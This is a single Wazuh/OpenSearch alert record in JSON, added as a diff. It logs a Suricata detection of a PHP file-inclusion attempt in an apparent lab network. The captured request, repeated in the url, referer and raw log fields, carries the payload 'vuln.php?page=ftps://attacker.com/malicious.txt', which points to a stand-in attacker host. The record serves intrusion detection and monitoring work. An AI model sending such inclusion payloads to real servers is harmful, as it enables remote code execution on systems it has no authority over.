@@ -1,0 +1,169 @@
+{
+  "_index": "wazuh-alerts-4.x-2026.04.29",
+  "_id": "lovx2J0BZfDcH36mY05K",
+  "_version": 1,
+  "_score": null,
+  "_source": {
+    "input": {
+      "type": "log"
+    },
+    "agent": {
+      "ip": "10.0.2.8",
+      "name": "wazuhagent",
+      "id": "002"
+    },
+    "manager": {
+      "name": "wazuhserver"
+    },
+    "data": {
+      "metadata": {
+        "flowbits": [
+          "http.dottedquadhost"
+        ]
+      },
+      "tx_id": "0",
+      "app_proto": "http",
+      "ip_v": "4",
+      "in_iface": "enp0s3",
+      "src_ip": "10.0.2.9",
+      "src_port": "54182",
+      "event_type": "alert",
+      "alert": {
+        "severity": "2",
+        "signature_id": "2013000",
+        "rev": "5",
+        "metadata": {
+          "mitre_tactic_id": [
+            "TA0001"
+          ],
+          "affected_product": [
+            "Web_Server_Applications"
+          ],
+          "attack_target": [
+            "Server"
+          ],
+          "updated_at": [
+            "2020_04_20"
+          ],
+          "confidence": [
+            "High"
+          ],
+          "created_at": [
+            "2011_06_10"
+          ],
+          "mitre_technique_id": [
+            "T1190"
+          ],
+          "mitre_technique_name": [
+            "Exploit_Public_Facing_Application"
+          ],
+          "mitre_tactic_name": [
+            "Initial_Access"
+          ],
+          "tag": [
+            "Local_File_Inclusion",
+            "Exploit",
+            "LFI",
+            "RFI"
+          ],
+          "signature_severity": [
+            "Major"
+          ],
+          "deployment": [
+            "Datacenter",
+            "Perimeter",
+            "Internal"
+          ]
+        },
+        "gid": "1",
+        "signature": "ET WEB_SERVER PHP Possible ftps Local File Inclusion Attempt",
+        "action": "allowed",
+        "category": "Web Application Attack"
+      },
+      "ts_progress": "request_complete",
+      "flow_id": "13126018128749.000000",
+      "dest_ip": "10.0.2.10",
+      "proto": "TCP",
+      "http": {
+        "hostname": "10.0.2.10",
+        "protocol": "HTTP/1.1",
+        "http_method": "GET",
+        "http_content_type": "text/html",
+        "http_refer": "http://10.0.2.10/vuln.php?page=ftps://attacker.com/malicious.txt",
+        "length": "1494",
+        "url": "/vuln.php?page=ftps://attacker.com/malicious.txt",
+        "http_user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
+        "status": "200"
+      },
+      "tc_progress": "response_complete",
+      "dest_port": "80",
+      "pkt_src": "wire/pcap",
+      "flow": {
+        "src_ip": "10.0.2.9",
+        "src_port": "54182",
+        "pkts_toserver": "4",
+        "dest_ip": "10.0.2.10",
+        "start": "2026-04-29T18:13:04.461808+0700",
+        "bytes_toclient": "2118",
+        "bytes_toserver": "894",
+        "pkts_toclient": "4",
+        "dest_port": "80"
+      },
+      "timestamp": "2026-04-29T18:13:04.487841+0700",
+      "direction": "to_server"
+    },
+    "rule": {
+      "firedtimes": 2,
+      "mail": true,
+      "level": 11,
+      "pci_dss": [
+        "6.5.1"
+      ],
+      "description": "CRITICAL: LFI Attack Detected - Suricata: Alert - ET WEB_SERVER PHP Possible ftps Local File Inclusion Attempt",
+      "groups": [
+        "suricata",
+        "lfi",
+        "critical_alerts",
+        "web_attack"
+      ],
+      "mitre": {
+        "technique": [
+          "Exploit Public-Facing Application"
+        ],
+        "id": [
+          "T1190"
+        ],
+        "tactic": [
+          "Initial Access"
+        ]
+      },
+      "id": "100302",
+      "gdpr": [
+        "IV_35.7.d"
+      ]
+    },
+    "location": "/var/log/suricata/eve.json",
+    "decoder": {
+      "name": "json"
+    },
+    "id": "1777461184.75529",
+    "full_log": "{\"timestamp\":\"2026-04-29T18:13:04.487841+0700\",\"flow_id\":13126018128749,\"in_iface\":\"enp0s3\",\"event_type\":\"alert\",\"src_ip\":\"10.0.2.9\",\"src_port\":54182,\"dest_ip\":\"10.0.2.10\",\"dest_port\":80,\"proto\":\"TCP\",\"ip_v\":4,\"pkt_src\":\"wire/pcap\",\"metadata\":{\"flowbits\":[\"http.dottedquadhost\"]},\"tx_id\":0,\"alert\":{\"action\":\"allowed\",\"gid\":1,\"signature_id\":2013000,\"rev\":5,\"signature\":\"ET WEB_SERVER PHP Possible ftps Local File Inclusion Attempt\",\"category\":\"Web Application Attack\",\"severity\":1,\"metadata\":{\"affected_product\":[\"Web_Server_Applications\"],\"attack_target\":[\"Server\"],\"confidence\":[\"High\"],\"created_at\":[\"2011_06_10\"],\"deployment\":[\"Datacenter\",\"Perimeter\",\"Internal\"],\"mitre_tactic_id\":[\"TA0001\"],\"mitre_tactic_name\":[\"Initial_Access\"],\"mitre_technique_id\":[\"T1190\"],\"mitre_technique_name\":[\"Exploit_Public_Facing_Application\"],\"signature_severity\":[\"Major\"],\"tag\":[\"Local_File_Inclusion\",\"Exploit\",\"LFI\",\"RFI\"],\"updated_at\":[\"2020_04_20\"]}},\"ts_progress\":\"request_complete\",\"tc_progress\":\"response_complete\",\"http\":{\"hostname\":\"10.0.2.10\",\"url\":\"/vuln.php?page=ftps://attacker.com/malicious.txt\",\"http_user_agent\":\"Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0\",\"http_content_type\":\"text/html\",\"http_refer\":\"http://10.0.2.10/vuln.php?page=ftps://attacker.com/malicious.txt\",\"http_method\":\"GET\",\"protocol\":\"HTTP/1.1\",\"status\":200,\"length\":1494},\"app_proto\":\"http\",\"direction\":\"to_server\",\"flow\":{\"pkts_toserver\":4,\"pkts_toclient\":4,\"bytes_toserver\":894,\"bytes_toclient\":2118,\"start\":\"2026-04-29T18:13:04.461808+0700\",\"src_ip\":\"10.0.2.9\",\"dest_ip\":\"10.0.2.10\",\"src_port\":54182,\"dest_port\":80}}",
+    "timestamp": "2026-04-29T11:13:04.777+0000"
+  },
+  "fields": {
+    "timestamp": [
+      "2026-04-29T11:13:04.777Z"
+    ],
+    "data.timestamp": [
+      "2026-04-29T11:13:04.487Z"
+    ]
+  },
+  "highlight": {
+    "agent.id": [
+      "@opensearch-dashboards-highlighted-field@002@/opensearch-dashboards-highlighted-field@"
+    ]
+  },
+  "sort": [
+    1777461184777
+  ]
+}
